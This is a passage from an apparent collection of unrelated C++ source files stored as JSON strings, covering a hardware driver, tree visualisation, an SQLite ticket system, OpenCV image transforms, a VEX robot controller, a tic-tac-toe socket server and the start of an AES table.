ADG728::setForced(bool forced)\n{\n  _forced = forced;\n}\n\n\nbool ADG728::getForced()\n{\n  return _forced;\n}\n\n\nint ADG728::getError()\n{\n  int error = _error;\n  _error = ADG728_OK;\n  return error;\n}\n\n\n//  -- END OF FILE --\n\n",
    "#include \"tree.hpp\"\n#include \"complex.hpp\"\n#include <iostream>\n#include <string>\n#include <algorithm>\n#include <vector>\n#include <SFML/Graphics.hpp>\n#include <cmath> \n#include <sstream> \n\nusing namespace std;\n\ntemplate <typename T>\nint depth_tree(Node<T>* node) \n{\n    if (!node) return 0;\n    int ans = 0;\n    for (auto& temp : node->descendence) {\n        ans = max(ans, depth_tree(temp.get()));\n    }\n    return ans + 1;\n}\n\ntemplate <typename T>\nvoid draw_tree(sf::RenderWindow &window, Node<T>* node, sf::Vector2f position, float space_horizontal, float space_verticale) \n{\n    //check if the root exists\n    if (!node) return;\n    //we drwa the circle\n    sf::CircleShape c(30);\n     //update position for the circle\n    c.setPosition(position.x - c.getRadius(), position.y - c.getRadius()); \n    //update color for the circle\n    c.setFillColor(sf::Color::Yellow); \n    //draw the circle\n    window.draw(c);\n    //load tthe font\n    sf::Font f;\n    if (!f.loadFromFile(\"/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf\")) \n    {\n        cerr << \"Error in the load of font\" << endl;\n        return;\n    }\n\n    sf::Text value_of_node;\n    value_of_node.setFont(f);\n    std::ostringstream s;\n    s << node->value;\n    //update the text to be the value of the node\n    value_of_node.setString(s.str());\n    //update the size of the text \n    value_of_node.setCharacterSize(15); \n    //update the color to write the value of the node\n    value_of_node.setFillColor(sf::Color::Red); \n    //update the position of the text \n    value_of_node.setPosition(position);\n    //draw the value ofthe node\n    window.draw(value_of_node);\n    //check the number childrens of the node\n    int descendence = node->descendence.size();\n    float t= -80.0f - (descendence - 1) * 20.0f; \n    //we pas on his all childrens\n    for (int i = 0; i < descendence ; ++i) {\n        auto& temp = node->descendence[i];\n        if (temp) { \n            float t1= (t + i * 30.0f )* M_PI / 180.0f;\n            sf::Vector2f new_position = position + sf::Vector2f(cos(t1) * space_horizontal, space_verticale);\n            \n            //line for the two childrens\n            //position of the left children and the children right \n            \n            sf::Vertex line[] = {\n                sf::Vertex(position + sf::Vector2f(0, 30)),\n                sf::Vertex(new_position + sf::Vector2f(0, -30))\n            };\n            //update color of the line\n            line->color = sf::Color::Black; \n            //draw the line for the two childrens (left and right)\n            window.draw(line, 2, sf::Lines);\n            //continue by recursively \n            draw_tree(window, temp.get(), new_position, space_horizontal / 1.9f, space_verticale * 1.0f); \n        }\n    }\n}\n\n\ntemplate <typename T>\nvoid visualize_tree(sf::RenderWindow& window, tree<T>& tree) \n{\n    Node<T>* root = tree.getRoot();\n    int depth = depth_tree(root);\n    sf::Vector2f emplacement_root(window.getSize().x / 2, 30);\n    draw_tree(window, root, emplacement_root,  window.getSize().x / (pow(2, depth - 1) + 1) * 2.5, window.getSize().y / (depth + 1) * 1.5);\n}\n\nint main() {\n    // Create a binary tree with integers\n    tree<int> tree1(2);\n    //create the children of the tree\n    tree1.add_root(1);\n    tree1.add_sub_node(1, 2); \n    tree1.add_sub_node(1, 3); \n    tree1.add_sub_node(2, 4); \n    tree1.add_sub_node(2, 5); \n    tree1.add_sub_node(3, 6); \n    tree1.add_sub_node(3, 7); \n\n    cout << \"Pre-order for binary tree with int: \";\n    for (auto it = tree1.begin_pre_order(); it != tree1.end_pre_order(); ++it) \n    {\n        cout << *it << \" \";\n    }\n    cout << endl;\n\n    cout << \"Post-order for binary tree with int: \";\n    for (auto it = tree1.begin_post_order(); it != tree1.end_post_order(); ++it)\n     {\n        cout << *it << \" \";\n    }\n    cout << endl;\n\n    cout << \"In-order for binary tree with int: \";\n    for (auto it = tree1.begin_in_order(); it != tree1.end_in_order(); ++it)\n     {\n        cout << *it << \" \";\n    }\n    cout << endl;\n\n    cout << \"Bfs for binary tree with int: \";\n    for (auto it = tree1.begin_bfs_scan(); it != tree1.end_bfs_scan(); ++it) \n    {\n        cout << *it << \" \";\n    }\n    cout << endl;\n\n    cout << \"Dfs for binary tree with int: \";\n    for (auto it = tree1.begin_dfs_scan(); it != tree1.end_dfs_scan(); ++it) \n    {\n        cout << *it << \" \";\n    }\n    cout << endl;\n\n    cout << \"Heap for binary tree with int: \";\n    for (auto it = tree1.begin_heap(); it != tree1.end_heap(); ++it) \n    {\n        cout << *it << \" \";\n    }\n    cout << endl;\n\n\n    // Create a binary tree with Complex numbers\n    tree<Complex> tree2(2);\n//create the children of the tree\n    tree2.add_root(Complex(1, 1));\n    tree2.add_sub_node(Complex(1, 1), Complex(2, 2)); \n    tree2.add_sub_node(Complex(1, 1), Complex(3, 3)); \n    tree2.add_sub_node(Complex(2, 2), Complex(4, 4)); \n    tree2.add_sub_node(Complex(2, 2), Complex(5, 5)); \n    tree2.add_sub_node(Complex(3, 3), Complex(6, 6)); \n    tree2.add_sub_nod",
    "#include <iostream>\n#include <sqlite3.h>\n#include <sstream>\n#include <string>\n#include <random>\n\n\n//Generatinig an random uint64_t value;\nuint64_t generate()\n{\n    //Setting up the random generator\n    std::random_device rd;\n    std::mt19937_64 gen(rd());\n    std::uniform_int_distribution<uint64_t> distr(0, std::numeric_limits<uint64_t>::max());\n\n    //Generating the ticket and return the value\n    uint64_t ticket = distr(gen);\n    return ticket;\n}\n\n//Gets an uint64_t value and stores it into a database\nint buy(sqlite3* db)\n{\n    //Getting the ticket_number\n    uint64_t ticket_number = generate();\n\n    //Setting up the command\n    std::stringstream cmd;\n    cmd << \"INSERT INTO tickets(ticket, arrived) VALUES(\" << ticket_number << \", FALSE);\";\n    std::string query = cmd.str();\n\n    //Variables\n    char *errmsg = nullptr;\n\n    //Executing the command\n    int rc = sqlite3_exec(db, query.c_str(), NULL, NULL, &errmsg);\n\n    //Error Handling\n    if (rc != SQLITE_OK)\n    {\n        std::cout << \"[!] Command execution failur.\" << std::endl;\n        return 1;\n    }\n    return 0;\n}\n\n//Gives back result for if the ticket exists\nint callback(void* success, int column_count, char** _not_used_a, char** _not_used_b) {\n    if (column_count == 1 && success != NULL) {\n        int* success_ptr = reinterpret_cast<int*>(success);\n        *success_ptr = 1;\n        return 0;\n    }\n    return 1;\n}\n\n//Verifies the ticket\nint verify(sqlite3* db, uint64_t ticket)\n{\n    //Setting up the query\n    std::stringstream cmd;\n    cmd << \"SELECT ticket FROM tickets WHERE ticket LIKE \"<< ticket<<\" AND arrived LIKE \" << \"FALSE;\";\n    std::string query = cmd.str();\n\n    //Variables\n    int success = 0;\n    char* errmsg = nullptr;\n    int rc = sqlite3_exec(db, query.c_str(), callback, reinterpret_cast<void*>(&success), &errmsg);\n\n    //Error Handling\n    if (rc != SQLITE_OK) {\n        std::cerr << \"SQL error: \" << errmsg << std::endl;\n        return 1;\n    }\n\n    //Verifing the ticket\n    if (success)\n    {\n        cmd.clear();\n        cmd << \"UPDATE tickets SET arrived = TRUE WHERE ticket LIKE \" << ticket << \" AND arrived LIKE \" << \"FALSE;\";\n        query = cmd.str();\n\n        rc = sqlite3_exec(db, query.c_str(), NULL, NULL, &errmsg);\n\n        if (rc != SQLITE_OK)\n        {\n            std::cout << \"[!] Commmand execution error.\" << std::endl;\n            return 1;\n        }\n        return 0;\n    }\n    return 1;\n}\n\nint main() \n{\n    //Variables\n    int choice;\n    int result;\n    uint64_t ticket;\n    sqlite3* db = nullptr;\n    char* errmsg;\n\n    //Creating the database file\n    int rc = sqlite3_open(\"ticket.db\", &db);\n\n    //Error Handling\n    if (rc)\n    {\n        std::cout << \"[!] Couldn't create database.\" << std::endl;\n    }\n    else \n    {\n        std::cout << \"[*] Database is setup!\" << std::endl;\n    }\n\n    //Creating the table\n    rc = sqlite3_exec(db, \"CREATE TABLE IF NOT EXISTS tickets(id INT PRIMARY KEY ASC, ticket, arrived);\", NULL, NULL, &errmsg);\n    \n    //Error Handling\n    if (rc != SQLITE_OK)\n    {\n        std::cout << \"[!] Command error\" << std::endl;\n    }\n    else\n    {\n        std::cout << \"[*] Command executed!\" << std::endl;\n    }\n    \n    //Display Options\n    std::cout << \"\\033[2J\\033[H\" << std::flush;\n    std::cout << \"[1] Buy \\n[2]Verify\" << std::endl;\n    std::cout << \"Enter: \";\n    std::cin >> choice;\n\n    //Error Handling for user input\n    while (choice > 2 or choice < 1)\n    {\n        std::cout << \"\\033[2J\\033[H\" << std::flush;\n        std::cout << \"[1] Buy \\n[2] Verify\" << std::endl;\n        std::cout << \"Enter: \";\n        std::cin >> choice;\n    }\n\n    //Checking user input\n    switch (choice)\n    {\n        //Buy\n        case 1:\n            \n            //Buying a ticket\n            result = buy(db);\n\n            //Result\n            if (result == 0)\n            {\n                std::cout << \"[*] Purchase was successful.\" << std::endl;\n                break;\n            }\n            else \n            {\n                std::cout << \"[!] Error...!\" << std::endl;\n                break;\n            }\n\n        //Verify\n        case 2:\n            //Asking for the ticket number\n            std::cout << \"\\033[2J\\033[H\" << std::flush;\n            std::cout << \"Enter Ticket Number: \";\n            std::cin >> ticket;\n            \n            //Verifying the ticket\n            result = verify(db, ticket);\n\n            //result\n            if (result == 0)\n            {\n                std::cout << \"[*] Ticket is Valid!\" << std::endl;\n                break;\n            }\n            else\n            {\n                std::cout << \"[*] Ticket is Invalid!\" << std::endl; \n                break;\n            }\n    }\n\n}\n",
    "#include <opencv2/opencv.hpp>\n#include <math.h> \n\nconst double pi = 3.14159265358979311599796346854;\n\nint Circle() {\n\n\tcv::Mat my_image(cv::Size(800, 450), CV_8SC3);\n\tcv::Scalar my_color_green(0, 255, 0);\n\n\tmy_image.setTo(my_color_green);\n\n\tcv::circle(my_image, cv::Point(400, 225), 200, cv::Scalar(255, 0, 0), -1);\n\tcv::circle(my_image, cv::Point(400, 225), 100, cv::Scalar(255, 255, 255), 10);\n\n\n\tcv::namedWindow(\"Display\");\n\tcv::imshow(\"Display\", my_image);\n\tcv::waitKey();\n\n\treturn 0;\n}\n\nint grayscale_image(cv::Mat image) {\n\t// Make a copy the same size, but a single color channel (C1)\n\tcv::Mat grayscale(image.size(), CV_8UC1);\n\n\t// Basic grayscale conversion\n\tfor (int y = 0; y < image.size().height; ++y) {\n\t\tfor (int x = 0; x < image.size().width; ++x) {\n\t\t\tcv::Vec3b colour = image.at<cv::Vec3b>(y, x);\n\t\t\tgrayscale.at<unsigned char>(y, x) =\n\t\t\t\t(unsigned char)((colour[0] + colour[1] + colour[2]) / 3.0 + 0.5);\n\t\t}\n\t}\n\n\t// Make a copy the same size, but a single color channel (C1)\n\tcv::Mat grayscale2(image.size(), CV_8UC1);\n\n\t// proper grayscale conversion\n\tfor (int y = 0; y < image.size().height; ++y) {\n\t\tfor (int x = 0; x < image.size().width; ++x) {\n\t\t\tcv::Vec3b colour = image.at<cv::Vec3b>(y, x);\n\t\t\tgrayscale2.at<unsigned char>(y, x) =\n\t\t\t\t(unsigned char)((colour[0] * .1 + colour[1] * .6 + colour[2] * .3));\n\t\t}\n\t}\n\n\tcv::namedWindow(\"Display\");\n\tcv::imshow(\"Display\", grayscale);\n\tcv::imshow(\"Display2\", grayscale2);\n\tcv::waitKey();\n\n\t// Save the results\n\tcv::imwrite(\"grey.png\", grayscale);\n\tcv::imwrite(\"grey2.png\", grayscale2);\n\n\treturn 0;\n}\n\ncv::Mat translationMatrix(double dx, double dy) {\n\tcv::Mat T = cv::Mat::eye(3, 3, CV_64F);\n\tT.at<double>(0, 2) = dx;\n\tT.at<double>(1, 2) = dy;\n\treturn T;\n}\n\ncv::Mat scaleMatrix(double s) {\n\tcv::Mat T = cv::Mat::eye(3, 3, CV_64F);\n\tT.at<double>(0, 0) = s;\n\tT.at<double>(1, 1) = s;\n\treturn T;\n}\n\ncv::Mat rotationMatrix(double angle) {\n\n\tdouble angleRad = (angle * pi)/180;\n\n\tcv::Mat T = cv::Mat::eye(3, 3, CV_64F);\n\tT.at<double>(0, 0) = (double)cos(angleRad);\n\tT.at<double>(1, 0) = (double)-sin(angleRad);\n\tT.at<double>(0, 1) = (double)sin(angleRad);\n\tT.at<double>(1, 1) = (double)cos(angleRad);\n\treturn T;\n}\n\ncv::Mat rotation(std::string filename) {\n\tcv::Mat original = cv::imread(filename);\n\n\t//what angle the picture needs to be at\n\tcv::Mat R = rotationMatrix(45);\n\n\t//finding the center of the image\n\tdouble x = original.size().width/2;\n\tdouble y = original.size().height/2;\n\n\tcv::Mat T1 = translationMatrix(x, y);\n\tcv::Mat T2 = translationMatrix(-x, -y);\n\n\t//define the corners of the image\n\tcv::Mat c1(3, 1, CV_64F);\n\tc1.at<double>(0, 0) = 0;\n\tc1.at<double>(1, 0) = 0;\n\tc1.at<double>(2, 0) = 1;\n\n\tcv::Mat c2(3, 1, CV_64F);\n\tc2.at<double>(0, 0) = original.size().width;\n\tc2.at<double>(1, 0) = 0;\n\tc2.at<double>(2, 0) = 1;\n\n\tcv::Mat c3(3, 1, CV_64F);\n\tc3.at<double>(0, 0) = original.size().width;\n\tc3.at<double>(1, 0) = original.size().height;\n\tc3.at<double>(2, 0) = 1;\n\n\tcv::Mat c4(3, 1, CV_64F);\n\tc4.at<double>(0, 0) = 0;\n\tc4.at<double>(1, 0) = original.size().height;\n\tc4.at<double>(2, 0) = 1;\n\n\tstd::vector<cv::Mat> corners = { c1, c2, c3, c4 };\n\tint TwoDPoints[4][2];\n\n\t//compute new coordinates to find their location in the image\n\tfor (int i = 0; i < corners.size(); i++) {\n\t\tcorners[i] = T1 * R * T2 * corners[i];\n\t\tTwoDPoints[i][0] = corners[i].at<double>(0, 0);\n\t\tTwoDPoints[i][1] = corners[i].at<double>(1, 0);\n\t}\n\n\t//finding min and max points\n\tint minX = TwoDPoints[0][0], minY = TwoDPoints[0][1];\n\tint maxX = TwoDPoints[0][0], maxY = TwoDPoints[0][1];\n\n\t// Iterate through the array to find min and max values\n\tfor (int i = 1; i < 4; i++) {\n\t\t// Update minX and maxX\n\t\tif (TwoDPoints[i][0] < minX)\n\t\t\tminX = TwoDPoints[i][0];\n\t\telse if (TwoDPoints[i][0] > maxX)\n\t\t\tmaxX = TwoDPoints[i][0];\n\n\t\t// Update minY and maxY\n\t\tif (TwoDPoints[i][1] < minY)\n\t\t\tminY = TwoDPoints[i][1];\n\t\telse if (TwoDPoints[i][1] > maxY)\n\t\t\tmaxY = TwoDPoints[i][1];\n\t}\n\n\t//find what size the new frame must be\n\tdouble FrameSizeX = maxX-minX;\n\tdouble FrameSizeY = maxY-minY;\n\n\tcv::Mat target(FrameSizeY, FrameSizeX, CV_8UC3);\n\n\tfor (int v = minY; v < maxY; ++v) {\n\t\tfor (int u = minX; u < maxX; ++u) {\n\t\t\t// The column vector [u, v, 1]\n\t\t\tcv::Mat s(3, 1, CV_64F);\n\t\t\ts.at<double>(0, 0) = u;\n\t\t\ts.at<double>(1, 0) = v;\n\t\t\ts.at<double>(2, 0) = 1;\n\n\t\t\tcv::Mat t1 = T1 * R * T2 * s;\n\n\t\t\tint u_ = (int)(t1.at<double>(0) / t1.at<double>(2) + 0.5);\n\t\t\tint v_ = (int)(t1.at<double>(1) / t1.at<double>(2) + 0.5);\n\n\t\t\tif (v_ >= 0 && v_ < original.size().height && u_ >= 0 && u_ < original.size().width) {\n\t\t\t\ttarget.at<cv::Vec3b>(v-minY, u-minX) = original.at<cv::Vec3b>(v_, u_);\n\t\t\t}\n\t\t}\n\t}\n\n\treturn target;\n}\n\ncv::Mat translation(std::string filename, double x, double y) {\n\tcv::Mat original = cv::imread(filename);\n\tcv::Mat target(original.size(), CV_8UC3);\n\tcv::Mat T = translationMatrix(x, y);\n\n\tfor (int v = 0; v < original.size().height; ++v) {\n\t\tfor (int u = 0; u < original.size().width; ++u) {\n\t\t\t// The column vector [u, v, 1]\n\t\t\tcv::Mat s(3",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"gps_cam\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"main.h\"\n\nconst float pi = 3.1415926535897932384626433;\nfloat tmp;\nfloat strafe;\nfloat forwd;\nfloat robotheta;\n\n/**\n * A callback function for LLEMU's center button.\n *\n * When this callback is fired, it will toggle line 2 of the LCD text between\n * \"I was pressed!\" and nothing.\n */\nvoid on_center_button() {\n\tstatic bool pressed = false;\n\tpressed = !pressed;\n\tif (pressed) {\n\t\tpros::lcd::set_text(2, \"I was pressed!\");\n\t} else {\n\t\tpros::lcd::clear_line(2);\n\t}\n}\n\n/**\n * Runs initialization code. This occurs as soon as the program is started.\n *\n * All other competition modes are blocked by initialize; it is recommended\n * to keep execution time for this mode under a few seconds.\n */\nvoid initialize() {\n\tpros::Imu imu_sensor(11);\n\tpros::lcd::initialize();\n\tpros::lcd::set_text(1, \"Hello PROS User!\");\n\n\tpros::lcd::register_btn1_cb(on_center_button);\n  \timu_sensor.reset();\n\n}\n\n/**\n * Runs while the robot is in the disabled state of Field Management System or\n * the VEX Competition Switch, following either autonomous or opcontrol. When\n * the robot is enabled, this task will exit.\n */\nvoid disabled() {}\n\n/**\n * Runs after initialize(), and before autonomous when connected to the Field\n * Management System or the VEX Competition Switch. This is intended for\n * competition-specific initialization routines, such as an autonomous selector\n * on the LCD.\n *\n * This task will exit when the robot is enabled and autonomous or opcontrol\n * starts.\n */\nvoid competition_initialize() {}\n\n/**\n * Runs the user autonomous code. This function will be started in its own task\n * with the default priority and stack size whenever the robot is enabled via\n * the Field Management System or the VEX Competition Switch in the autonomous\n * mode. Alternatively, this function may be called in initialize or opcontrol\n * for non-competition testing purposes.\n *\n * If the robot is disabled or communications is lost, the autonomous task\n * will be stopped. Re-enabling the robot will restart the task, not re-start it\n * from where it left off.\n */\nvoid autonomous() {}\n\n/**\n * Runs the operator control code. This function will be started in its own task\n * with the default priority and stack size whenever the robot is enabled via\n * the Field Management System or the VEX Competition Switch in the operator\n * control mode.\n *\n * If no competition control is connected, this function will run immediately\n * following initialize().\n *\n * If the robot is disabled or communications is lost, the\n * operator control task will be stopped. Re-enabling the robot will restart the\n * task, not resume it from where it left off.\n */\nvoid opcontrol() {\n\tpros::Controller master(pros::E_CONTROLLER_MASTER);\n\tpros::Imu imu_sensor(11);\n\tpros::Motor rightback(5);    // Creates a motor group with forwards ports 1 & 3 and reversed port 2\n\tpros::Motor rightfront(6);    // Creates a motor group with forwards ports 1 & 3 and reversed port 2\n\tpros::Motor leftback(-7);    // Creates a motor group with forwards ports 1 & 3 and reversed port 2\n\tpros::Motor leftfront(-2);    // Creates a motor group with forwards ports 1 & 3 and reversed port 2\n\tint time = pros::millis();\n\tint iter = 0;\n\twhile (imu_sensor.is_calibrating()) {\n\t\tprintf(\"IMU calibrating... %d\\n\", iter);\n\t\titer += 10;\n\t\tpros::delay(10);\n\t}\n    printf(\"IMU is done calibrating (took %d ms)\\n\", iter - time);\n\twhile (true) {\n\t\trobotheta = (imu_sensor.get_rotation() * (pi / 180));\n   \t\ttmp = (cos(robotheta) * (-1 * master.get_analog(ANALOG_LEFT_Y)) + sin(robotheta) * (-1 * master.get_analog(ANALOG_LEFT_X)));\n    \tstrafe = (sin(robotheta) * (master.get_analog(ANALOG_LEFT_Y)) + cos(robotheta) * (-1 * master.get_analog(ANALOG_LEFT_X)));\n\t\tforwd = tmp;\n\n\t\tif (master.get_analog(ANALOG_RIGHT_X) != 0) {\n\t\t\tleftfront.move(-0.5 * master.get_analog(ANALOG_RIGHT_X)); \n\t\t\trightfront.move(0.5 * master.get_analog(ANALOG_RIGHT_X)); \n\t\t\trightback.move(0.5 * master.get_analog(ANALOG_RIGHT_X)); \n\t\t\tleftback.move(-0.5 * master.get_analog(ANALOG_RIGHT_X)); \n\t\t}\n\t\telse {\n\t\t\tleftfront.move(0.5 * (forwd + strafe));\t\n\t\t\trightfront.move((forwd - strafe) * 0.5);\t\n\t\t\trightback.move(0.5 * (forwd + strafe));\t\n\t\t\tleftback.move((forwd - strafe) * 0.5);\t\n\t\t}\n\t\tprintf(\"rotation: %f radians\\n\", robotheta);\n\t\tprintf(\"rotation: %f degrees\\n\", imu_sensor.get_rotation());\n\t\tpros::lcd::print(0, \"%d %d %d\", (pros::lcd::read_buttons() & LCD_BTN_LEFT) >> 2,\n\t\t                 (pros::lcd::read_buttons() & LCD_BTN_CENTER) >> 1,\n\t\t                 (pros::lcd::read_buttons() & LCD_BTN_RIGHT) >> 0);  // Prints status of the emulated screen LCDs\n\n\t\t// Arcade control scheme\n\t\tpros::delay(20);                               // Run for 20 ms then update\n\t}\n}",
    "#include <iostream>\n#include <string>\n#include <vector>\n#include <netinet/in.h>\n#include <unistd.h>\n\n#define PORT 8080\n\nusing namespace std;\n\nchar board[3][3];\nchar current_marker;\nint current_player;\nint client_sockets[2];\n\nvoid initialize_board() {\n    int position = 0;\n    for (int i = 0; i < 3; ++i) {\n        for (int j = 0; j < 3; ++j) {\n            board[i][j] = '0' + position;\n            position++;\n        }\n    }\n}\n\nvoid print_board() {\n    for (int i = 0; i < 3; ++i) {\n        for (int j = 0; j < 3; ++j) {\n            cout << board[i][j];\n            if (j < 2) cout << \" | \";\n        }\n        cout << endl;\n        if (i < 2) cout << \"--|---|--\" << endl;\n    }\n}\n\nstring board_to_string() {\n    string board_str;\n    for (int i = 0; i < 3; ++i) {\n        for (int j = 0; j < 3; ++j) {\n            board_str += board[i][j];\n            if (j < 2) board_str += \" | \";\n        }\n        if (i < 2) board_str += \"\\n--|---|--\\n\";\n    }\n    return board_str;\n}\n\nbool place_marker(int slot) {\n    int row = slot / 3;\n    int col = slot % 3;\n    if (board[row][col] == 'X' || board[row][col] == 'O') return false;\n    board[row][col] = current_marker;\n    return true;\n}\n\nint check_winner() {\n    // Verifica linhas e colunas\n    for (int i = 0; i < 3; ++i) {\n        if ((board[i][0] == board[i][1] && board[i][1] == board[i][2]) && board[i][0] != ' ')\n            return current_player;\n        if ((board[0][i] == board[1][i] && board[1][i] == board[2][i]) && board[0][i] != ' ')\n            return current_player;\n    }\n    // Verifica diagonais\n    if ((board[0][0] == board[1][1] && board[1][1] == board[2][2]) && board[0][0] != ' ')\n        return current_player;\n    if ((board[0][2] == board[1][1] && board[1][1] == board[2][0]) && board[0][2] != ' ')\n        return current_player;\n    \n    return 0;\n}\n\nbool board_full() {\n    for (int i = 0; i < 3; ++i)\n        for (int j = 0; j < 3; ++j)\n            if (board[i][j] != 'X' && board[i][j] != 'O') return false;\n    return true;\n}\n\nvoid send_to_all_clients(string message) {\n    for (int i = 0; i < 2; ++i) {\n        send(client_sockets[i], message.c_str(), message.size(), 0);\n    }\n}\n\nvoid handle_game() {\n    current_marker = 'X';\n    current_player = 1;\n    \n    while (true) {\n        string board_str = board_to_string();\n        string msg = \"Vez do Jogador \" + to_string(current_player) + \". Escolha uma posi\u00e7\u00e3o (0-8):\\n\" + board_str + \"\\n\";\n        send_to_all_clients(msg);\n        \n        int slot;\n        recv(client_sockets[current_player - 1], &slot, sizeof(slot), 0);\n        \n        if (place_marker(slot)) {\n            print_board();\n            board_str = board_to_string();\n            int winner = check_winner();\n            if (winner != 0) {\n                cout << \"Jogador \" << winner << \" ganhou!\" << endl;\n                string win_msg = \"Jogador \" + to_string(current_player) + \" ganhou!\\n\" + board_str + \"\\n\";\n                send_to_all_clients(win_msg);\n                break;\n            } else if (board_full()) {\n                send_to_all_clients(\"Deu velha!\\n\" + board_str + \"\\n\");\n                break;\n            }\n            current_player = (current_player % 2) + 1;\n            current_marker = (current_marker == 'X') ? 'O' : 'X';\n        } else {\n            send(client_sockets[current_player - 1], \"Movimento inv\u00e1lido. Tente novamente.\\n\", 32, 0);\n        }\n    }\n}\n\nint main() {\n    int server_fd;\n    struct sockaddr_in address;\n    int opt = 1;\n    int addrlen = sizeof(address);\n    \n    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == 0) {\n        perror(\"Falha ao criar socket\");\n        exit(EXIT_FAILURE);\n    }\n\n    if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &opt, sizeof(opt))) {\n        perror(\"Falha ao configurar socket\");\n        exit(EXIT_FAILURE);\n    }\n\n    address.sin_family = AF_INET;\n    address.sin_addr.s_addr = INADDR_ANY;\n    address.sin_port = htons(PORT);\n\n    if (bind(server_fd, (struct sockaddr *)&address, sizeof(address)) < 0) {\n        perror(\"Falha ao vincular socket\");\n        exit(EXIT_FAILURE);\n    }\n\n    if (listen(server_fd, 2) < 0) {\n        perror(\"Falha ao ouvir no socket\");\n        exit(EXIT_FAILURE);\n    }\n\n    for (int i = 0; i < 2; ++i) {\n        if ((client_sockets[i] = accept(server_fd, (struct sockaddr *)&address, (socklen_t*)&addrlen)) < 0) {\n            perror(\"Falha ao aceitar conex\u00e3o\");\n            exit(EXIT_FAILURE);\n        }\n        // Envia o n\u00famero do jogador para o cliente\n        int player_number = i + 1;\n        send(client_sockets[i], &player_number, sizeof(player_number), 0);\n    }\n\n    initialize_board();\n    handle_game();\n\n    for (int i = 0; i < 2; ++i) {\n        close(client_sockets[i]);\n    }\n    close(server_fd);\n\n    return 0;\n}\n",
    "#include <iostream>\n#include <iomanip>\n#include <vector>\n#include <string>\n#include <sstream>\n#include <cstdint> // For uint8_t\n#include <algorithm>\n#include <cstring>\n#include <cctype> // for isspace\n\n\n#define Nr 10 //number of rounds\n#define Nk 4 //key length\n#define Nb 4 //block size\n\nusing namespace std;\nstatic const uint8_t sbox[256] = {\n  //0     1    2      3     4    5     6     7      8    9     A      B    C     D     E     F\n  0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76, //0\n  0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0, //1\n  0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15, //2 \n  0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75, //3\n  0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84, //4\n  0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf, //5\n  0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8, //6\n  0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2, //7\n  0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73, //8\n  0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb, //9\n  0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79, //A\n  0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08, //B\n  0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a, //C\n  0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e, //D\n  0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf, //E\n  0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16 }; //F\n\nstatic const uint8_t inversesbox[256] = {\n  0x52, 0x09, 0x6a, 0xd5, 0x30, 0x36, 0xa5, 0x38, 0xbf, 0x40, 0xa3, 0x9e, 0x81, 